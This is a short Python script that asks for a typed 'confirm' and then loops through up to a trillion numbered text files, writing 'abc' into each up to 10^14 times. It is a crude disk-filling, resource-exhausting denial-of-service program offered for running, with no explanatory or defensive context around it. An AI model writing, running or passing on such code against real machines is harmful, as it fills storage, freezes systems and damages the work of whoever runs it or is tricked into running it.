a = input("If you relly want to do this type in confirm (if dont just type no): ")

if a == "no":
    exit()
elif a == "confirm":
    print("You wanted this.")

h = 0
n = 0
r = 0
x = 0

def function1():
    global h
    h = 0
    while h < 1000000000000:
        h += 1
        global f
        f = open(f"{n}.txt", "w")
        f.close()

def function2():
    x = 0
    f = open(f"{n}.txt", "w")
    while x < 100000000000000:
        x += 1
        f.write("abc")

while n < 1000000000000:
    n += 1
    function1()
    function2()